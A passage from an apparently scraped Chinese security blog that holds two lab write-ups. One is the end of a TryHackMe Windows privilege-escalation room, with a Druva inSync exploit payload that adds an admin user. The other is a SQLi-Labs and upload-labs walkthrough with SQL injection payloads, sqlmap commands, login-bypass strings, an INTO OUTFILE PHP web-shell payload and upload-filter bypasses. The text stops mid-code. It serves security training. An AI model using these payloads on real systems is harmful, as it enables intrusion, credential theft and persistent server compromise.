$s.Send($rpcType) $s.Send($length) $s.Send($command) 您可以弹出 Powershell 控制台并直接粘贴漏洞来执行它（该漏洞也可以在目标计算机中的 C:\\tools\\Druva_inSync_exploit.txt 中找到）。请注意，在 $cmd 变量中指定的漏洞利用的默认负载将在系统中创建一个名为 pwnd 的用户，但不会为其分配管理权限，因此我们可能想要更改有效负载以获得更有用的东西。对于这个房间，我们将更改有效负载以运行以下命令： net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add 这将创建密码为 SimplePass123 的用户 pwnd 并将其添加到管理员组中。如果利用成功，您应该能够运行以下命令来验证用户 pwnd 是否存在并且属于管理员组： Command Prompt 命令提示符 PS C:\\&gt; net user pwnd User name pwnd Full Name Account active Yes [...] Local Group Memberships *Administrators *Users Global Group memberships *None 最后一步，您可以以管理员身份运行命令提示符： 0x05 自动化工具 有几个脚本可以以类似于上一个任务中看到的方式进行系统枚举。这些工具可以缩短枚举过程时间并发现不同的潜在特权升级向量。但是，请记住，自动化工具有时可能会错过权限升级。 以下是一些常用于识别权限升级向量的工具。请随意针对这个房间中的任何机器运行它们，看看结果是否与讨论的攻击向量相匹配。 5.1 WinPEAS WinPEAS 是一个开发用于枚举目标系统以发现权限提升路径的脚本。您可以找到有关 winPEAS 的更多信息并下载预编译的可执行文件或 .bat 脚本。 WinPEAS 将运行与上一个任务中列出的命令类似的命令并打印其输出。 winPEAS 的输出可能很长，有时难以阅读。这就是为什么最好始终将输出重定向到文件，如下所示： C:\\&gt; winpeas.exe &gt; outputfile.txt WinPEAS 可在此处下载：here 5.2 PrivescCheck PrivescCheck 是一个 PowerShell 脚本，用于搜索目标系统上的常见权限升级。它提供了 WinPEAS 的替代方案，无需执行二进制文件。 PrivescCheck 可在此处下载 here. 提醒：要在目标系统上运行 PrivescCheck，您可能需要绕过执行策略限制。为此，您可以使用 Set-ExecutionPolicy cmdlet，如下所示。 PS C:\\&gt; Set-ExecutionPolicy Bypass -Scope process -Force PS C:\\&gt; . .\\PrivescCheck.ps1 PS C:\\&gt; Invoke-PrivescCheck 5.3 WES-NG 一些漏洞利用建议脚本（例如 winPEAS）将要求您将它们上传到目标系统并在那里运行它们。这可能会导致防病毒软件检测并删除它们。为了避免发出不必要的噪音来吸引注意力，您可能更喜欢使用 WES-NG，它将在您的攻击机器上运行（例如 Kali 或 TryHackMe AttackBox）。 WES-NG 是一个 Python 脚本，可以在此处找到并下载。 here. 安装后，在使用之前，请键入 wes.py --update 命令来更新数据库。该脚本将引用它创建的数据库来检查是否有缺失的补丁，这些补丁可能会导致您可以利用漏洞来提升您在目标系统上的权限。 要使用该脚本，您需要在目标系统上运行 systeminfo 命令。不要忘记将输出定向到您需要移动到攻击计算机的 .txt 文件。 完成后，wes.py 可以按如下方式运行； user@kali$ wes.py systeminfo.txt 5.4 Metasploit 元分析软件 如果目标系统上已有 Meterpreter shell，则可以使用 multi/recon/local_exploit_suggester 模块列出可能影响目标系统的漏洞，并允许您提升目标系统上的权限。","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"常规漏洞学习总结","path":"/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/","content":"0x01 SQLi_Lab Less-1 关键源码如下： &lt;?php include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; ....... $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); ....... echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; } 可以看到这里为get类型传参，且传入的id参数没有经过任何过滤便插入到了SQL语句中，且可以清晰看到闭合方式为单引号。 另外值得注意的是这里用了mysql_error()函数来显示数据库可能的报错信息。 这意味着我们可以进行联合、报错、布尔、时间盲注。 联合注入 ?id=-1' union select 1,group_concat(username,0x7e,password),3 from users--+ 报错注入 ?id=1' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select concat(username,0x7e,password)from users limit 0,1))a from information_schema.tables group by a)b)--+ 手动修改limit 0,1进行结果偏移 布尔盲注 ?id=1' and left(database(),1)&gt;'r'--+ ?id=1' and left(database(),1)&gt;'s'--+ 时间盲注 ?id=1' and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+ ?id=1' and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+ sqlmap 联合注入 python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-1/?id=1\" --dbms=MySQL --random-agent --flush-session --technique=U -v3 python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-1/?id=1\" --dbms=MySQL --random-agent --flush-session -D security -T users -C username --dump python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-1/?id=1\" --dbms=MySQL --random-agent --flush-session -D security -T users -C password --dump 报错注入 python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-1/?id=1\" --dbms=MySQL --random-agent --flush-session --technique=E -v3 布尔盲注 python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-1/?id=1\" --dbms=MySQL --random-agent --flush-session --technique=B -v3 延时盲注 python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-1/?id=1\" --dbms=MySQL --random-agent --flush-session --technique=T -v3 Less-2 关键代码如下 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\" \"); fclose($fp); // connectivity $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; } } 与上一关类似，只不过参数id这次为数字类型，闭合方式不一样而已。不在赘述了 Less-3 关键代码如下 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\" \"); fclose($fp); // connectivity $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; } } 同样的，这次闭合方式为单引号+括号，其余不变 Less-4 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\" \"); fclose($fp); // connectivity $id = '\"' . $id . '\"'; $sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; } } 也是相同道理，不过在插入SQL语句之前，对id参数内容进行了双引号的拼接，看似复杂，其实就是将闭合方式换为了双引号+括号 Less-5 关键代码如下 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\" \"); fclose($fp); // connectivity $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font size=\"3\" color=\"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; } } 这里的闭合方式换为了单引号闭合，但是与之前四关不同的是，这一关不能采用联合注入了，因为代码中不会输出有关查询结果的信息 Less-6 关键代码如下 &lt;?php if(isset($_GET['id'])) { $id=$_GET['id']; // connectivity $id = '\"'.$id.'\"'; $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font size=\"3\" color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; } } 与Less-5类似，只是更换闭合方式为双引号了 Less-7 关键代码如下 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; $sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You are in.... Use outfile......'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You have an error in your SQL syntax'; //print_r(mysql_error()); echo \"&lt;/font&gt;\"; } } 这里又进行了变动，首先是闭合方式改为了单引号+双括号方式，其次将mysql_error()注释掉了。这意味着我们不能进行联合注入与报错注入，只能进行时间和布尔盲注。可以手工验证后，直接sqlmap跑 盲注 布尔盲注 python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-7/?id=1\" --dbms=MySQL --random-agent --flush-session --technique=B -v3 Payload: id=1') AND 8283=8283 AND ('xwjv'='xwjv 时间盲注 python3 sqlmap.py -u \"http://127.0.0.1/sqllabs/Less-7/?id=1\" --dbms=MySQL --random-agent --flush-session --technique=T -v3 Payload: id=1') AND (SELECT 3626 FROM (SELECT(SLEEP(5)))Nmqc) AND ('PMsB'='PMsB 导出数据到文件 echo 'You are in.... Use outfile......'; 根据上述作者的提示，我们尝试将数据库数据导入到文件进行读取 在此之前我们先看一下数据库环境变量： mysql&gt; show global variables like '%secure%'; +--------------------------+-------+ | Variable_name | Value | +--------------------------+-------+ | require_secure_transport | OFF | | secure_auth | ON | | secure_file_priv | | +--------------------------+-------+ 3 rows in set (0.04 sec) ure_file_priv 的值为 null ，表示限制 mysqld 不允许导入 | 导出 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入 | 导出只能发生在 /tmp/ 目录下 当 secure_file_priv 的值为 空 时，表示不对 mysqld 的导入 | 导出做限制 可见我们这里是空的，因此可以进行导入导出 ?id=1')) union select * from security.users into outfile 'D:\\\\labwork\\\\phpstudy_pro\\\\WWW\\\\sqllabs\\\\Less-7\\\\users.txt'--+ 这里我们可以指定导出路径，当然我这里是Windows下，如果在linux下不指定路径，则默认mysql的导出路径为： /var/lib/mysql/security 这里也可以看到导出成功 但一般这种情况下，如果我们可以向Web目录写文件的时候，通常是直接写shell ?id=1')) union select 1,2,\"&lt;?php @eval($_POST['hybcx']);?&gt;\" into outfile 'D:\\\\labwork\\\\phpstudy_pro\\\\WWW\\\\sqllabs\\\\Less-7\\\\shell.php'--+ 可以看到写入成功 Less-8 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; //echo 'You are in...........'; //print_r(mysql_error()); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; } } 与Less-7类似，只不过闭合方式改为了单引号闭合。 Less-9 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; //print_r(mysql_error()); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; } } 这一关也进行了较为明显的改动，那就是无论执行SQL语句之后，是否成功，页面回显情况都一致。这意味着我们只能进行时间盲注。 Less-10 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; $id = '\"'.$id.'\"'; $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; //print_r(mysql_error()); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; } } 与Less-9类似，但参数id闭合方式改为了双引号 Less-11 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) { $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname); fwrite($fp,'Password:'.$passwd.\" \"); fclose($fp); // connectivity @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } } ?&gt; 这一关整体框架如同Less-1一般，只不过注入点发生在了form表单处，也就是post型注入。 看代码可以发现，这里对usernam与password参数没有进行任何检查。 万能密码 一般这种表单处，最简单的漏洞就是万能密码的利用了，而这里也是存在的。 uname=admin' or '1'='1&amp;passwd=asd&amp;submit=Submit 可以看到成功进入，且不需要输入正确的密码。其余类似构造如下： # 注释掉 passwd 来登录 uname=admin'--+&amp;passwd=&amp;submit=Submit uname=admin'#&amp;passwd=&amp;submit=Submit # 注释后面语句 并 添加一个永真条件 uname=admin&amp;passwd=1' or 1--+&amp;submit=Submit uname=admin&amp;passwd=1'||1--+&amp;submit=Submit uname=admin&amp;passwd=1' or 1#&amp;submit=Submit uname=admin&amp;passwd=1'||1#&amp;submit=Submit # 闭合后面语句 并 添加一个永真条件 uname=admin&amp;passwd=1'or'1'='1&amp;submit=Submit uname=admin&amp;passwd=1'||'1'='1&amp;submit=Submit 联合注入 uname=1'union select 1,(select group_concat(username,0x7e,password)from users)#&amp;passwd=hybcx&amp;submit=Submit 报错注入 uname=hybcx&amp;passwd=1'and (select 1 from(select count(*),concat(floor(rand(0)*2),(select concat(username,0x7e,password)from users limit 0,1))a from information_schema.tables group by a)b)-- mOVv&amp;submit=Submit --错误例子 uname=hybcx&amp;passwd=1' and updatexml(1,concat(0x7e,(select concat(username,0x7e,password)from users limit 0,1)),1)#&amp;submit=Submit --正确例子 uname=hybcx&amp;passwd=1' union select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.columns group by x#&amp;submit=Submit --正确例子 这里本想着继续尝试floor的报错方式，但这里似乎并不支持，找了诸多文章，发现大概是select 1 from中的数字1问题，这里的数据库似乎不支持这种方式，select 1的意思是指定某一列： mysql&gt; select 1 from users; +---+ | 1 | +---+ | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | | 1 | +---+ 13 rows in set (0.03 sec) 而这里如果不添加select 1 的语句，则会成功报错 布尔盲注 uname=admin' and left(database(),1)&gt;'r'#&amp;passwd=&amp;submit=Submit uname=admin' and left(database(),1)&gt;'s'#&amp;passwd=&amp;submit=Submit 时间盲注 uname=admin' and if(ascii(substr(database(),1,1))&gt;114,1,sleep(4))#&amp;passwd=&amp;submit=Submit uname=admin' and if(ascii(substr(database(),1,1))&gt;115,1,sleep(4))#&amp;passwd=&amp;submit=Submit sqlmap 直接拿出bp抓到的数据，保存为txt即可 POST /sqllabs/Less-11/ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 88 Origin: http://127.0.0.1 Connection: close Referer: http://127.0.0.1/sqllabs/Less-11/ Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 uname=test&amp;passwd=123&amp;submit=Submit 然后直接使用 sqlmap 的 -r 参数来加载这个请求包： python3 sqlmap.py -r res.txt 也可以手动通过 --data 来对 POST 的数据包内容进行注入检测： sqlmap -u \"http://127.0.0.1/sqllab/Less-11/\" --data=\"uname=admin&amp;passwd=2333&amp;submit=Submit\" 实际上 --data 比较鸡肋，操作效率比较低。 联合注入 python3 sqlmap.py -r res.txt -p \"uname\" --dbms=MySQl --random-agent --flush-session --technique=U -v3 报错注入 python3 sqlmap.py -r res.txt -p \"uname\" --dbms=MySQl --random-agent --flush-session --technique=E -v3 布尔盲注 python3 sqlmap.py -r res.txt -p \"uname\" --dbms=MySQl --random-agent --flush-session --technique=B -v3 时间盲注 python3 sqlmap.py -r res.txt -p \"uname\" --dbms=MySQl --random-agent --flush-session --technique=T -v3 Less-12 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) { $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname.\" \"); fwrite($fp,'Password:'.$passwd.\" \"); fclose($fp); // connectivity $uname='\"'.$uname.'\"'; $passwd='\"'.$passwd.'\"'; @$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } } ?&gt; 与上一关类似，不过闭合方式改为了双引号+括号的方式 Less-13 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) { $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname.\" \"); fwrite($fp,'Password:'.$passwd.\" \"); fclose($fp); // connectivity @$sql=\"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; //echo 'Your Login name:'. $row['username']; //echo \"&lt;br&gt;\"; //echo 'Your Password:' .$row['password']; //echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } } ?&gt; 由于这里将查询结果的输出注释掉了，意味着我们无法进行联合注入。并且闭合方式改为了单引号+括号 Less-14 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) { $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname.\" \"); fwrite($fp,'Password:'.$passwd.\" \"); fclose($fp); // connectivity $uname='\"'.$uname.'\"'; $passwd='\"'.$passwd.'\"'; @$sql=\"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; //echo 'Your Login name:'. $row['username']; //echo \"&lt;br&gt;\"; //echo 'Your Password:' .$row['password']; //echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } } ?&gt; 与Less-13类似，只是闭合方式改为了双引号闭合 Less-15 &lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) { $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname); fwrite($fp,'Password:'.$passwd.\" \"); fclose($fp); // connectivity @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; //echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; //echo 'Your Password:' .$row['password']; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; //print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } } ?&gt; 注释掉了mysql_error函数，这意味着我们只能进行布尔和时间盲注了。同时闭合方式为单引号 0x02 upload-labs Pass-01 function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") { alert(\"请选择要上传的文件!\"); return false; } //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) { var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; } } 可以看到，关键的file参数是从前端提取到的，如果file为指定的上述三种类型，则可以成功上传，如果不是指定类型，则会有个弹窗。 所有的操作都是在前端进行的，也就是说如果我们能绕过前端检验直接进行后端，就可以上传任意文件了。因为后端并没有进行任何检查。 这里绕过方式可以是：前端禁用js，或者bp抓包进入后端。 前端禁用js 这里用F12禁用js，上传即可 验证成功 bp抓包 首先上传一个后缀正确的文件，之后bp抓包随后修改后缀为php，如下图上传成功 Pass-02 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确，请重新上传！'; } } else { $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; } } 这里看到代码对文件type做出了限制，我们百度很容易搜到这样的信息： $_FILES[myFile][name] 显示客户端文件的原名称。 $_FILES[myFile][type] 文件的 MIME 类型，例如image/gif。 $_FILES[myFile][size] 已上传文件的大小，单位为字节。 $_FILES[myFile][tmp_name] 储存的临时文件名，一般是系统默认。 $_FILES[myFile][error] 该文件上传的代码，PHP4.2版本后增加的 因此我们bp修改MIME类型即可绕过 Pass-03 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 这里对上传的文件后缀进行了黑名单的过滤，但我们可以使用一些畸形（不常见的）后缀名进行绕过 如 php1、php2、php3、php4、php5、php7、pht、phtml、 phar、 phps、Asp、aspx、cer、cdx、 asa、asax、jsp、jspa、jspx等畸形后缀名。 前提条件：即Apache的httpd.conf有配置代码 AddType application/x-httpd-php .pht .phtml .phps .php5 .pht . 我们可以进入配置文件查看一下： 那这里直接上传这里剩下的三个后缀即可绕过 成功上传 Pass-04 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = 